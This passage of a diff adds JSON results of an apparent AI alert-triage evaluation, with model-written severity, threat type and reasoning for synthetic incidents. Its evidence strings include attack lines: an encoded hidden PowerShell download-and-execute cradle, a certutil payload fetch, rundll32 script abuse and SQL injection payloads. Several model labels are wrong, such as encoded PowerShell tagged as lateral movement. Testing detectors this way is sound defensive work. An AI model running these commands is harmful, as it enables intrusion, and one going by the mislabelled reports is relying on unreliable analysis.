+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "ws-dev-09"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:ws-dev-09. Detections: Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218. [ws-dev-09] rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"new ActiveXObject('WScript.Shell')\")"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_3fe23f1fb9f1",
+      "entity": "host:web-app-10",
+      "rule_ids": [
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218"
+      ],
+      "report": {
+        "alert_id": "inc_3fe23f1fb9f1",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on host web-app-10 due to Living-off-the-land binary abuse, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host web-app-10 for signs of compromise and review system logs for further information.",
+        "confidence_score": 0.85,
+        "reasoning": "The presence of T1218 (Signed Binary Proxy Execution) MITRE ATT&CK technique, combined with the use of rundll32.exe and ActiveXObject, suggests a potential Living-off-the-land binary abuse attack.",
+        "processed_at": "2026-08-07T19:17:38.188009",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "web-app-10"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:web-app-10. Detections: Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218. [web-app-10] rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"new ActiveXObject('WScript.Shell')\")"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_efaf293e7908",
+      "entity": "src_ip:203.0.113.158",
+      "rule_ids": [
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_efaf293e7908",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A potential SQL injection attack has been detected on a web request from IP address 203.0.113.158, targeting an unknown web application.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the source IP address 203.0.113.158 and review web application logs for potential vulnerabilities.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a SQL injection pattern in a web request is a strong indicator of a potential attack. The presence of the MITRE ATT&CK technique T1190 further supports this assessment.",
+        "processed_at": "2026-08-07T19:17:42.557980",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.158"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:203.0.113.158. Detections: SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1190. [ws-dev-12] GET /report.php?id=-1' UNION SELECT NULL,NULL,NULL--"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_0fd5d4407555",
+      "entity": "host:fin-ops-08",
+      "rule_ids": [
+        "PROC-ENC-PS-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1059.001"
+      ],
+      "report": {
+        "alert_id": "inc_0fd5d4407555",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical alert has been triggered on host fin-ops-08 due to the detection of an encoded PowerShell command. This suggests a potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host fin-ops-08 for signs of compromise and isolate it from the network to prevent further potential damage.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of an encoded PowerShell command, along with the detection of MITRE ATT&CK techniques T1027 and T1059.001, indicates a high likelihood of a malicious activity. The unknown source IP and protocol further support the critical severity of this alert.",
+        "processed_at": "2026-08-07T19:17:50.122062",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "fin-ops-08"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[CRITICAL] Encoded PowerShell command on host:fin-ops-08. Detections: Encoded PowerShell command. MITRE ATT&CK techniques tagged by detector: T1027, T1059.001. [fin-ops-08] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADEANQA1AC8AeAAuAHAAcwAxACcAKQA="
+        }
+      }
+    },
+    {
+      "incident_id": "inc_7b76c90fa785",
+      "entity": "src_ip:198.51.100.242",
+      "rule_ids": [
+        "AUTH-SPRAY-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110.003"
+      ],
+      "report": {
+        "alert_id": "inc_7b76c90fa785",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity password spraying attack has been detected originating from IP address 198.51.100.242, targeting multiple accounts.",
+        "threat_type": "Password Spraying",
+        "recommended_action": "Block the source IP address 198.51.100.242 and investigate the affected accounts for potential unauthorized access.",
+        "confidence_score": 0.95,
+        "reasoning": "The detection of password spraying across accounts, coupled with the presence of MITRE ATT&CK technique T1110.003, indicates a coordinated and targeted attack. The high severity rating and lack of additional context suggest a high confidence in the threat assessment.",
+        "processed_at": "2026-08-07T19:17:54.633726",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.242"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Password spraying across accounts on src_ip:198.51.100.242. Detections: Password spraying across accounts. MITRE ATT&CK techniques tagged by detector: T1110.003."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_4553add1923a",
+      "entity": "host:iot-cam-07",
+      "rule_ids": [
+        "NET-C2-PORT-001"
+      ],
+      "ground_truth_mitre": [
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_4553add1923a",
+        "severity_assessment": "MEDIUM",
+        "threat_summary": "A potential command and control (C2) communication has been detected on the IoT camera host iot-cam-07, indicating possible unauthorized access or malicious activity.",
+        "threat_type": "Command and Control (C2) activity",
+        "recommended_action": "Investigate the IoT camera host iot-cam-07 for signs of compromise and review network traffic for similar suspicious connections.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a connection to a known C2-associated port (1337) on the IoT camera host, coupled with the presence of MITRE ATT&CK technique T1571, suggests a potential C2 communication, warranting further investigation.",
+        "processed_at": "2026-08-07T19:18:00.242331",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.232"
+          ],
+          "hosts": [
+            "iot-cam-07"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "1337"
+          ],
+          "text": "[MEDIUM] Connection to known C2-associated port on host:iot-cam-07. Detections: Connection to known C2-associated port. MITRE ATT&CK techniques tagged by detector: T1571."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_4908a067641b",
+      "entity": "host:fin-ops-02",
+      "rule_ids": [
+        "PROC-ENC-PS-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1059.001"
+      ],
+      "report": {
+        "alert_id": "inc_4908a067641b",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical alert has been triggered on host fin-ops-02 due to the detection of an encoded PowerShell command, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host fin-ops-02 for signs of compromise and isolate it from the network to prevent further potential damage.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of an encoded PowerShell command, along with the detection of MITRE ATT&CK techniques T1027 and T1059.001, suggests a potential attempt to move laterally within the network, which warrants immediate investigation and isolation of the affected host.",
+        "processed_at": "2026-08-07T19:18:06.766157",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "fin-ops-02"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[CRITICAL] Encoded PowerShell command on host:fin-ops-02. Detections: Encoded PowerShell command. MITRE ATT&CK techniques tagged by detector: T1027, T1059.001. [fin-ops-02] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADEAOQA2AC8AeAAuAHAAcwAxACcAKQA="
+        }
+      }
+    },
+    {
+      "incident_id": "inc_081f1ae1550a",
+      "entity": "src_ip:203.0.113.192",
+      "rule_ids": [
+        "AUTH-SPRAY-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110.003"
+      ],
+      "report": {
+        "alert_id": "inc_081f1ae1550a",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity password spraying attack has been detected originating from IP address 203.0.113.192, targeting multiple accounts.",
+        "threat_type": "Password Spray Attack",
+        "recommended_action": "Investigate the source IP 203.0.113.192 and block it to prevent further unauthorized access.",
+        "confidence_score": 0.9,
+        "reasoning": "The detection of password spraying across accounts, coupled with the presence of MITRE ATT&CK technique T1110.003, indicates a coordinated and targeted attack. The high severity rating and lack of additional context suggest a high confidence in the threat assessment.",
+        "processed_at": "2026-08-07T19:18:12.285302",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.192"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Password spraying across accounts on src_ip:203.0.113.192. Detections: Password spraying across accounts. MITRE ATT&CK techniques tagged by detector: T1110.003."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_a815fef6529f",
+      "entity": "src_ip:198.51.100.184",
+      "rule_ids": [
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_a815fef6529f",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A potential SQL injection attack has been detected on the web server, with an attacker attempting to inject malicious SQL code through a GET request.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the web server logs and network traffic to identify the source of the attack and block the malicious IP address.",
+        "confidence_score": 0.9,
+        "reasoning": "The detection of a SQL injection pattern in a web request, along with the presence of a MITRE ATT&CK technique (T1190), indicates a high likelihood of a malicious attack. The unknown protocol and port further suggest that the attack may be attempting to exploit a vulnerability in the web server.",
+        "processed_at": "2026-08-07T19:18:17.663566",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.184"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:198.51.100.184. Detections: SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1190. [iot-cam-01] GET /report.php?id=-1' UNION SELECT NULL,NULL,NULL--"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_95a6a44ab250",
+      "entity": "host:fin-ops-09",
+      "rule_ids": [
+        "NET-C2-PORT-001"
+      ],
+      "ground_truth_mitre": [
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_95a6a44ab250",
+        "severity_assessment": "MEDIUM",
+        "threat_summary": "A potential command and control (C2) communication has been detected on host fin-ops-09, with a connection to a known C2-associated port 31337.",
+        "threat_type": "Command and Control (C2) activity",
+        "recommended_action": "Investigate the host fin-ops-09 for potential malware or unauthorized access, and review system logs for further information.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a connection to a known C2-associated port, combined with the presence of MITRE ATT&CK technique T1571, suggests a potential C2 communication. However, the unknown protocol and lack of payload snippet reduce the confidence score.",
+        "processed_at": "2026-08-07T19:18:23.124678",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.190"
+          ],
+          "hosts": [
+            "fin-ops-09"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "31337"
+          ],
+          "text": "[MEDIUM] Connection to known C2-associated port on host:fin-ops-09. Detections: Connection to known C2-associated port. MITRE ATT&CK techniques tagged by detector: T1571."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_1b00e57bd9fa",
+      "entity": "src_ip:198.51.100.133",
+      "rule_ids": [
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_1b00e57bd9fa",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A potential SQL injection attack has been detected on a web request from IP address 198.51.100.133, targeting a vulnerable web application.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the source IP address 198.51.100.133 and block it temporarily to prevent further attacks. Review the web application for SQL injection vulnerabilities.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a SQL injection pattern in a web request is a strong indicator of a potential attack. The presence of the MITRE ATT&CK technique T1190 further supports this assessment.",
+        "processed_at": "2026-08-07T19:18:28.641458",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.133"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:198.51.100.133. Detections: SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1190. [ws-mktg-07] POST /search.php body=q=' UNION SELECT username,password FROM users--"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_fcaed0e20258",
+      "entity": "host:ws-dev-11",
+      "rule_ids": [
+        "NET-EXFIL-001"
+      ],
+      "ground_truth_mitre": [
+        "T1048"
+      ],
+      "report": {
+        "alert_id": "inc_fcaed0e20258",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A large outbound transfer to an external host was detected on the ws-dev-11 host, indicating potential data exfiltration.",
+        "threat_type": "Data Exfiltration",
+        "recommended_action": "Investigate the ws-dev-11 host for potential unauthorized data transfer and review network traffic logs for further context.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a large outbound transfer to an external host on a specific host, combined with the tagging of T1048 (Exfiltration over Command and Control Channel) by the detector, suggests a high likelihood of data exfiltration.",
+        "processed_at": "2026-08-07T19:18:34.163713",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.228"
+          ],
+          "hosts": [
+            "ws-dev-11"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "443"
+          ],
+          "text": "[HIGH] Large outbound transfer to external host on host:ws-dev-11. Detections: Large outbound transfer to external host. MITRE ATT&CK techniques tagged by detector: T1048."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_bdb9778ec8d0",
+      "entity": "host:ws-mktg-06",
+      "rule_ids": [
+        "NET-EXFIL-001"
+      ],
+      "ground_truth_mitre": [
+        "T1048"
+      ],
+      "report": {
+        "alert_id": "inc_bdb9778ec8d0",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A large outbound transfer to an external host was detected on the host ws-mktg-06, indicating potential unauthorized data exfiltration.",
+        "threat_type": "Data Exfiltration",
+        "recommended_action": "Investigate the host ws-mktg-06 for signs of unauthorized access or malicious activity, and review the system logs for further information.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a large outbound transfer to an external host on a specific host, combined with the tagging of MITRE ATT&CK technique T1048, suggests a potential data exfiltration attempt.",
+        "processed_at": "2026-08-07T19:18:39.680198",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.171"
+          ],
+          "hosts": [
+            "ws-mktg-06"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "22"
+          ],
+          "text": "[HIGH] Large outbound transfer to external host on host:ws-mktg-06. Detections: Large outbound transfer to external host. MITRE ATT&CK techniques tagged by detector: T1048."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_f8432810a35d",
+      "entity": "host:web-app-09",
+      "rule_ids": [
+        "NET-EXFIL-001"
+      ],
+      "ground_truth_mitre": [
+        "T1048"
+      ],
+      "report": {
+        "alert_id": "inc_f8432810a35d",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A large outbound transfer to an external host was detected on the web application server web-app-09, indicating potential data exfiltration.",
+        "threat_type": "Data Exfiltration",
+        "recommended_action": "Investigate the web application server web-app-09 for potential security breaches and review network traffic logs for further information.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a large outbound transfer to an external host on a web application server is a strong indicator of potential data exfiltration, as seen in MITRE ATT&CK technique T1048. The unknown protocol and payload snippet add to the uncertainty, but the high severity and large transfer size suggest a potential security incident.",
+        "processed_at": "2026-08-07T19:18:44.096134",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.208"
+          ],
+          "hosts": [
+            "web-app-09"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "8443"
+          ],
+          "text": "[HIGH] Large outbound transfer to external host on host:web-app-09. Detections: Large outbound transfer to external host. MITRE ATT&CK techniques tagged by detector: T1048."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_da5983d9bad7",
+      "entity": "host:web-app-06",
+      "rule_ids": [
+        "PROC-ENC-PS-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1059.001"
+      ],
+      "report": {
+        "alert_id": "inc_da5983d9bad7",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical alert has been triggered on host web-app-06 due to the detection of an encoded PowerShell command, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host web-app-06 for signs of compromise and take immediate action to contain and remediate the issue.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of an encoded PowerShell command, along with the detection of MITRE ATT&CK techniques T1027 and T1059.001, suggests a potential attempt to move laterally within the network, which warrants a critical severity assessment.",
+        "processed_at": "2026-08-07T19:18:51.623675",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "web-app-06"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[CRITICAL] Encoded PowerShell command on host:web-app-06. Detections: Encoded PowerShell command. MITRE ATT&CK techniques tagged by detector: T1027, T1059.001. [web-app-06] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADEAMgAvAHgALgBwAHMAMQAnACkA"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_b52e33ac9a8f",
+      "entity": "src_ip:203.0.113.160",
+      "rule_ids": [
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_b52e33ac9a8f",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A potential SQL injection attack has been detected on a web request from IP address 203.0.113.160, targeting a vulnerable web application.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the source IP address 203.0.113.160 and block it temporarily to prevent further potential attacks. Review the web application for vulnerabilities and apply necessary patches.",
+        "confidence_score": 0.85,
+        "reasoning": "The presence of a SQL injection pattern in the web request body, along with the detection of MITRE ATT&CK technique T1190, indicates a high likelihood of a malicious attack. The unknown protocol and port further suggest that the attack may be attempting to exploit a vulnerability in the web application.",
+        "processed_at": "2026-08-07T19:18:57.125417",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.160"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:203.0.113.160. Detections: SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1190. [ws-dev-06] POST /search.php body=q=' UNION SELECT username,password FROM users--"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_10bc0303af84",
+      "entity": "host:web-app-03",
+      "rule_ids": [
+        "PROC-ENC-PS-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1059.001"
+      ],
+      "report": {
+        "alert_id": "inc_10bc0303af84",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical alert has been triggered on host web-app-03 due to the detection of an encoded PowerShell command, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement/Command and Control",
+        "recommended_action": "Investigate the host web-app-03 for signs of compromise and isolate it from the network to prevent further potential damage.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of an encoded PowerShell command, along with the detection of MITRE ATT&CK techniques T1027 and T1059.001, suggests a potential attempt to execute malicious code on the host, warranting a critical severity assessment.",
+        "processed_at": "2026-08-07T19:19:03.764872",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "web-app-03"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[CRITICAL] Encoded PowerShell command on host:web-app-03. Detections: Encoded PowerShell command. MITRE ATT&CK techniques tagged by detector: T1027, T1059.001. [web-app-03] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADIANAAvAHgALgBwAHMAMQAnACkA"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_931db81a4f55",
+      "entity": "src_ip:198.51.100.134",
+      "rule_ids": [
+        "AUTH-BRUTE-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110"
+      ],
+      "report": {
+        "alert_id": "inc_931db81a4f55",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered due to brute-force logon attempts originating from the IP address 198.51.100.134. This activity may indicate an unauthorized access attempt.",
+        "threat_type": "Password Cracking",
+        "recommended_action": "Investigate the source IP address 198.51.100.134 and block it to prevent further attempts. Review login logs for potential compromised credentials.",
+        "confidence_score": 0.85,
+        "reasoning": "The alert indicates a high-severity brute-force logon attempt, which is a common technique used by attackers to gain unauthorized access. The presence of MITRE ATT&CK technique T1110 further supports this assessment.",
+        "processed_at": "2026-08-07T19:19:09.284141",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.134"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Brute-force logon attempts on src_ip:198.51.100.134. Detections: Brute-force logon attempts. MITRE ATT&CK techniques tagged by detector: T1110."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_b2f56bdf7e1f",
+      "entity": "host:api-gw-05",
+      "rule_ids": [
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218"
+      ],
+      "report": {
+        "alert_id": "inc_b2f56bdf7e1f",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on host api-gw-05 due to Living-off-the-land binary abuse, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host api-gw-05 for signs of compromise and review the system logs for any suspicious activity.",
+        "confidence_score": 0.85,
+        "reasoning": "The presence of certutil.exe executing a URL cache command suggests an attempt to download and execute a binary from an external source, which is a common tactic in Living-off-the-land binary abuse attacks.",
+        "processed_at": "2026-08-07T19:19:14.801958",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "api-gw-05"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:api-gw-05. Detections: Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218. [api-gw-05] certutil.exe -urlcache -split -f http://192.0.2.2/stage2.bin s2.bin"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_94c3358cdfef",
+      "entity": "src_ip:198.51.100.94",
+      "rule_ids": [
+        "AUTH-SPRAY-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110.003"
+      ],
+      "report": {
+        "alert_id": "inc_94c3358cdfef",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity password spraying attack has been detected originating from IP address 198.51.100.94, targeting multiple accounts.",
+        "threat_type": "Password Spray Attack",
+        "recommended_action": "Block the source IP address 198.51.100.94 and investigate the affected accounts for potential password compromise.",
+        "confidence_score": 0.95,
+        "reasoning": "The detection of password spraying across accounts, coupled with the identification of MITRE ATT&CK technique T1110.003, strongly indicates a password spray attack. The high severity rating and lack of additional context suggest a high confidence in this assessment.",
+        "processed_at": "2026-08-07T19:19:19.223204",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
